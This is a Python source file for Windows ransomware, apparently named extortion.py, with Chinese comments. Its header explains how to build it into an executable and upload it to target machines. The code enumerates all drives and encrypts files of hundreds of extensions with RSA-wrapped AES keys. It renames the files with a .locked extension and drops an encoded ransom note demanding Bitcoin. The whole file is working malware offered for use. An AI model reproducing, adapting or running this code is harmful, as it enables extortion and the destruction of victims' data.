import os
import sys
import rsa
import time
import threading
from ctypes import windll
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Random import get_random_bytes

"""
 执行python extortion.py get创建密钥对，将public.pub里的值复制到变量public_key中 
 使用pyinstaller -F -w extortion.py生成exe文件 ，然后将病毒上传到目标机器上       
 执行extortion.exe开始加密                                                     
 解密时将private.pem文件上传到病毒路径下，执行extortion.exe de解密               
"""

lock = threading.Lock()
threads = []
skip_dic=[
    "/usr/",
    "/etc/",
    ":\\Windows\\",
    ":\\Intel\\",
    ":\\nvidia\\",
    ":\\$RECYCLE.BIN\\",
    ":\\Program Files (x86)\\",
    ":\\Program Files\\",
    ":\\System Volume Information\\",
    "\\ProgramData",
    "\\All Users\\",
    "\\AppData\\Local\\Temp",
    "\\Local Settings\\Temp"
    "\\Application Data\\",
]
public_key=b"""-----BEGIN RSA PUBLIC KEY-----
MIIBCgKCAQEAsHXivgAhldI0PjdSYbntSm/ra/UsL4F+7TbkBuGd2+y5/hUfsHZH
t4NNEVyzG6g4y8OhXktQc9XtxIJrRcB0Ib30c4a6YBY/qrg225Xih0eGCiIgZLGj
vScssyRu6NOL/1hf3c/66whTiWlmY3h30N9/Mwy9qU4kjrA/YMRqmTcvIAis48nQ
Hycs8Ipq6SZj/WbFzLk0EKyytChduLXk9LIZHnz4o0gpYHivGWxwNmtRKqfyN0CT
gWOHh0YvvoecY4C1zlJ4SBEncFiD7Mdu9XOm20DqKC39dYEvV0WJ6gUfZo1h2VHP
56lj0K0ZR0nNBaH/f/xLg2Jk/pzXfOD6dwIDAQAB
-----END RSA PUBLIC KEY-----"""

#创建密钥对
def CreateRSAKeys():
    (pubkey, privkey) = rsa.newkeys(2048)

    with open("public.pub", "wb") as f:
        f.write(pubkey.save_pkcs1())

    with open("private.pem", "wb") as f:
        f.write(privkey.save_pkcs1())

#生成信息
def get_msg():
    author = '薛定的饿猫'
    email = 'luk.mail.cn@gmail.com'
    msg ="77u/RU5HTElTSDoKI1doYXQgaGFwcGVuZWQ/CkFMTCB5b3VyIGltcG9ydGFudCBmaWxlcyhkYXRhYmFzZSxkb2N1bWVudHMsaW1hZ2VzLHZpZGVvcyxtdXNpYyxldGMuKWhhdmUgYmVlbiBlbmNyeXB0ZWQhCkFuZCBvbmx5IHdlIGNhbiBkZWNyeXB0IQpUbyBkZWNyeXB0IHlvdXIgZmlsZXMseW91IG5lZWQgdG8gYnV5IHRoZSBkZWNyeXB0aW9uIGtleSBmcm9tIHVzLgpXZSBhcmUgdGhlIG9ubHkgb25lIHdobyBjYW4gZGVjcnlwdCB0aGUgZmlsZSBmb3IgeW91LgoKI0F0dGVudGlvbiEKVHJ5aW5nIHRvIHJlaW5zdGFsbCB0aGUgc3lzdGVtIGFuZCBkZWNyeXB0aW5nIHRoZSBmaWxlIHdpdGggYSB0aGlyZC1wYXJ0eSB0b29sIHdpbGwgcmVzdWx0CmluIGZpbGUgY29ycnVwdGlvbix3aGljaCBtZWFucyBubyBvbmUgY2FuIGRlY3J5cHQgeW91ciBmaWxlLihpbmNsdWRpbmcgdXMpLAppZiB5b3Ugc3RpbGwgdHJ5IHRvIGRlY3J5cHQgdGhlIGZpbGUgeW91cnNlbGYseW91IGRvIHNvIGF0IHlvdXIgb3duIHJpc2shCgojVGVzdCBkZWNyeXB0aW9uIQpBcyBhIHByb29mLHlvdSBjYW4gZW1haWwgdXMgMyBmaWxlcyB0byBkZWNyeXB0LAphbmQgd2Ugc3RpbGwgc2VuZCB5b3UgdGhlIHJlY292ZXJlZCBmaWxlcyB0byBwcm92ZSB0aGF0IHdlIGNhbiBkZWNyeXB0IHlvdXIgZmlsZXMuCgojSG93IHRvIGRlY3J5cHQ/CjEuQnV5ICgwLjIpIEJpdGNvaW4uCjIuU2VuZCAoMC4yKSBCaXRjb2luIHRvIHRoZSBwYXltZW50IGFkZHJlc3MuCjMuRW1haWwgeW91ciBJRCB0byB1cyxhZnRlciB2ZXJpZmljYXRpb24sd2Ugd2lsbCBjcmVhdGUgYSBkZWNyeXB0aW9uIHRvb2wgZm9yIHlvdS4KClJlbWVtYmVyLGJhZCB0aGluZ3MgaGF2ZSBoYXBwZW5lZCxub3cgbG9vayBhdCB5b3VyIGRldGVybWluYXRpb24gYW5kIGFjdGlvbiEKCkF1dGhvcjojYXV0aG9yCkUtbWFpbDpsdWsubWFpbC5jbkBnbWFpbC5jb20KUGF5bWVudDromZrmi5/luIHpkrHljIXlnLDlnYAKCgoK5Lit5paH77yaCiPlj5HnlJ/kuobku4DkuYg/CuaCqOaJgOacieeahOmHjeimgeaWh+S7tu+8iOaVsOaNruW6k+OAgeaWh+aho+OAgeWbvuWDj+OAgeinhumikeOAgemfs+S5kOetie+8ieW3suiiq+WKoOWvhu+8geW5tuS4lOWPquacieaIkeS7rOaJjeiDveino+Wvhu+8gQoKI+azqOaEj+S6i+mhue+8gQrlsJ3or5Xph43mlrDlronoo4Xns7vnu5/lubbkvb/nlKjnrKzkuInmlrnlt6Xlhbfop6Plr4bmlofku7blsIblr7zoh7Tmlofku7bmjZ/lnY/vvIzov5nmhI/lkbPnnYDmsqHmnInkurrlj6/ku6Xop6Plr4bmgqjnmoTmlofku7YK77yI5YyF5ous5oiR5Lus77yJ77yM5aaC5p6c5oKo5LuN5bCd6K+V6Ieq6KGM6Kej5a+G5paH5Lu277yM5YiZ6ZyA6Ieq6KGM5om/5ouF6aOO6Zmp77yBCgoj5rWL6K+V6Kej5a+G77yBCuS9nOS4uuivgeaYju+8jOaCqOWPr+S7pemAmui/h+eUteWtkOmCruS7tuWQkeaIkeS7rOWPkemAgTPkuKropoHop6Plr4bnmoTmlofku7bvvIzmiJHku6zkvJrlsIbmgaLlpI3lkI7nmoTmlofku7blj5HpgIHnu5nmgqjvvIwK5Lul6K+B5piO5oiR5Lus5Y+v5Lul6Kej5a+G5oKo55qE5paH5Lu244CCCgoj5aaC5L2V6Kej5a+GCjEu6LSt5LmwICgwLjIpIOS4quavlOeJueW4gQoyLuWwhiAoMC4yKSDkuKog5q+U54m55biB5Y+R6YCB5Yiw5LuY5qy+5Zyw5Z2ACjMu5bCG5oKo55qESUTpgJrov4fnlLXlrZDpgq7ku7blj5HpgIHnu5nmiJHku6zvvIznu4/moLjlrp7lkI7vvIzmiJHku6zlsIbkuLrmgqjliLbkvZzop6Plr4blt6XlhbcKCuivt+iusOS9j++8jOacgOWdj+eahOS6i+aDheW3sue7j+WPkeeUn+S6hu+8jOeOsOWcqOWwseeci+aCqOeahOWGs+W/g+WSjOihjOWKqOS6hu+8gQoK5L2c6ICFOiNhdXRob3IK6YKu566x5Zyw5Z2A77yabHVrLm1haWwuY25AZ21haWwuY29tCuS7mOasvuWcsOWdgO+8muiZmuaLn+W4gemSseWMheWcsOWdgAo="
    msg = b64decode(msg)
    address="虚拟币钱包地址"
    msg = msg.decode('utf-8')
    msg = msg.replace("#author",author)
    msg = msg.replace("#email",email)
    msg = msg.replace('#address',address)
    msg = msg.encode('utf-8')
    return msg

# 获取磁盘
def get_drives():
    drives = []
    bitmask = windll.kernel32.GetLogicalDrives()
    letter = ord('A')
    while bitmask > 0:
        if bitmask & 1:
            drives.append(chr(letter) + ':\\')
        bitmask >>= 1
        letter += 1
    return drives

#加密
def Encrypt(filename):
    lockname = filename + ".locked"
    if os.path.isfile(lockname):
        return 0
    if "HELLO_lOOK_AT_ME.txt" in filename:
        return 0
    try:
        data = ''
        # 二进制只读打开文件，读取文件数据
        with open(filename, 'rb') as f:
            data = f.read()
        out_file = open(filename, 'wb')
        # 收件人秘钥 - 公钥
        recipient_key = RSA.import_key(public_key)
        #一个 16 字节的会话密钥
        session_key = get_random_bytes(16)
        # 使用公共 RSA 密钥加密会话密钥
        cipher_rsa = PKCS1_OAEP.new(recipient_key)
        out_file.write(cipher_rsa.encrypt(session_key))
        # 使用 AES 会话密钥加密数据
        cipher_aes = AES.new(session_key, AES.MODE_EAX)
        ciphertext, tag = cipher_aes.encrypt_and_digest(data)
        out_file.write(cipher_aes.nonce)
        out_file.write(tag)
        #print(tag)
        out_file.write(ciphertext)
        out_file.close()
        time.sleep(1)
        os.rename(filename,lockname)
    except:
        pass

#解密
def Descrypt(filename):
    ext = ".locked"
    code = 'knockknock'
    try:
        with open(filename, 'rb') as fobj:
            # 导入私钥
            private_key = RSA.import_key(open('private.pem').read(), passphrase=code)
            # 会话密钥， 随机数，消息认证码，机密的数据
            
            enc_session_key, nonce, tag, ciphertext = [ fobj.read(x) 
                                                        for x in (private_key.size_in_bytes(), 
                                                        16, 16, -1) ]
            
            cipher_rsa = PKCS1_OAEP.new(private_key)
            session_key = cipher_rsa.decrypt(enc_session_key)
            
            cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)
            #print(tag)
            
            # 解密
            data = cipher_aes.decrypt_and_verify(ciphertext, tag)
            
        
        with open(filename, 'wb') as dfile:
            dfile.write(data)
        #print(filename)
        os.rename(filename, filename.replace('.locked', ""))
    except:
        print(filename)


def discoverFiles_encry(startpath,msg):
    # 遍历加密文件

    # 加密的文件后缀
    ENCRYPTABLE_FILETYPES = [
        # ".txt"
        # GENERAL FORMATS
        ".dat", ".keychain", ".sdf", ".vcf",".NDF",".ndf",
        # IMAGE FORMATS
        ".jpg", ".png", ".tiff", ".tif", ".gif", ".jpeg", ".jif", ".jfif", ".jp2", ".jpx", ".j2k", ".j2c", ".fpx", ".pcd", ".bmp",
        ".svg",
        ".3dm", ".3ds", ".max", ".obj", ".dds", ".psd", ".tga", ".thm", ".tif", ".tiff", ".yuv", ".ai", ".eps", ".ps", ".svg", ".indd",
        ".pct",".pem",".ldf",".LDF",".key",".KEY",".exe",".dll",".DLL",
        # VIDEO FORMATS
        ".mp4", ".avi", ".mkv", ".3g2", ".3gp", ".asf", ".flv", ".m4v", ".mov", ".mpg", ".rm", ".srt", ".swf", ".vob", ".wmv",
        ".vep",".pbb",".zhc",".zhl",
        # DOCUMENT FORMATS
        ".doc",".DOC", ".docx",".DOCX", ".txt",".TXT", ".pdf",".PDF", ".log",".LOG", ".msg", ".odt", ".pages", ".rtf", ".tex", ".wpd", ".wps", ".csv", ".ged", ".key",
        ".pps",
        ".ppt", ".pptx", ".xml", ".json", ".xlsx",".XLSX", ".xlsm", ".xlsb",".XLSB" ,".xls",".XLS", ".mht", ".mhtml" ,".htm", ".html",".Html", ".xltx", ".prn",
        ".dif",
        ".slk", ".xlam", ".xla", ".ods", ".docm", ".dotx", ".dotm", ".xps", ".ics",".md",".part",".chm",".text",".TEXT",".config",".CONFIG",
        # SOUND FORMATS
        ".mp3", ".aif", ".iff", ".m3u", ".m4a", ".mid", ".mpa", ".wav", ".wma",".jks",".xsd",".properties",".policy",".dwg",".dwg",
        ".dwt",".DWT",".dws",".DWS",".dxf",".fla",".FLA",".hpp",".HPP",".LRG",
        # EXE AND PROGRAM FORMATS
        ".msi", ".php", ".apk", ".app", ".bat",".BAT", ".cgi", ".com", ".asp", ".aspx", ".cer", ".cfm", ".css", ".htm", ".Htm",
        ".js", ".jsp", ".rss", ".xhtml", ".c", ".class", ".cpp", ".cs", ".h", ".pyc" , ".py" , ".java", ".lua", ".pl", ".sh", ".sln",
        ".swift" , ".vb",".VB",".vcxproj",".BAK",".mf",".MF",".jar",".com",".net",".NET",".cmd",".CMD",".bashrc",".cnf",".skp",".myd",".frm",".MYI",".ps1",
        # GAME FILES
        ".dem", ".gam", ".nes", ".rom", ".sav",".x3d",".spi",".ack",".pak",".lnk",".md5",".ins",".war",".reg",".cab",
        # COMPRESSION FORMATS
        ".tgz", ".zip", ".rar", ".tar", ".7z", ".cbr", ".deb", ".gz", ".pkg", ".rpm", ".zipx", ".iso",".z",".vsdx",".TMP",".Lst",
        # MISC
        ".ged", ".accdb", ".db", ".dbf", ".mdb", ".sql", ".fnt", ".fon", ".otf", ".ttf", ".cfg", ".ini", ".prf", ".bak", ".old", ".tmp",
        ".torrent" , ".rbk" ,".rep" , ".dbb",".mdf",".MDF",".wdb"
        ]
    #print(ENCRYPTABLE_FILETYPES)
    
    for dirpath, dirs, files in os.walk(startpath, topdown=True):
        #print(startpath)
        #print(dirpath)
        #print(files)
        try:
            file_path = os.path.dirname(dirpath)
            #print(file_path)
            infof = os.path.join(file_path, "HELLO_lOOK_AT_ME.txt")
            #print(infof)
            with open(infof, "wb") as f:
                f.write(msg)
        except:
            pass
        for dic in skip_dic:
            if dic in dirpath:
                dic = None
                break
            else:
                if dic == None:
                    continue
            for i in files:
                absolute_path = os.path.abspath(os.path.join(dirpath, i))
                file, ext = os.path.splitext(i)
                if ext in ENCRYPTABLE_FILETYPES:
                    t=threading.Thread(target=Encrypt,args=(absolute_path,))
                    threads.append(t)
                    t.start()
                    print('Encrypt[+] ',absolute_path)
            break
    #print(threads)
    for t in threads:
        t.join()

def discoverFiles_decry(startpath):
    # 遍历解密文件
    ext = ".locked"
    files_to_dec = []
    for root, dirs, files in os.walk(startpath):
        #print(files)
        for file in files:
            root_file = os.path.join(root, file)
            #print(os.path.join(root, file))
            if "HELLO_lOOK_AT_ME.txt" == file:
                os.remove(root_file)
            #print(file+" : "+str(file.endswith(str(ext))))
            if file.endswith(str(ext)):
                t=threading.Thread(target=Descrypt,args=(root_file,))
                threads.append(t)
                t.start()
                #Descrypt(root_file)
                print('Decrypt[+] ',root_file)
    for t in threads:
        t.join()
                


def main():
    msg=get_msg()
    #os_system = check_os() # 操作系统检测
    if len(sys.argv) == 1:
        drives=get_drives()
        desk = os.path.join(os.path.expanduser("~"), 'Desktop') + "\\"
        back_file = desk + "HELLO_lOOK_AT_ME.txt"
        if not os.path.exists(back_file):
            with open(back_file, "wb") as f:
                f.write(msg)
        for drive in drives:
            t = threading.Thread(target=discoverFiles_encry, args=(drive,msg)).start()
        #startpath="C:\\Windows\\Temp\\test"
        #discoverFiles_encry(startpath,msg)
    if len(sys.argv) == 2:
        # 解密
        if sys.argv[1]=='de':
            drives=get_drives()
            for drive in drives:
                t = threading.Thread(target=discoverFiles_decry, args=(drive,)).start()
            desk = os.path.join(os.path.expanduser("~"), 'Desktop') + "\\"
            back_file = desk + "HELLO_lOOK_AT_ME.txt"
            if os.path.exists(back_file):
                os.remove(back_file)
            #startpath="C:\\Windows\\Temp\\test"
            #discoverFiles_decry(startpath)
        elif sys.argv[1]=='get':
            CreateRSAKeys()

if __name__ == "__main__":
    main()

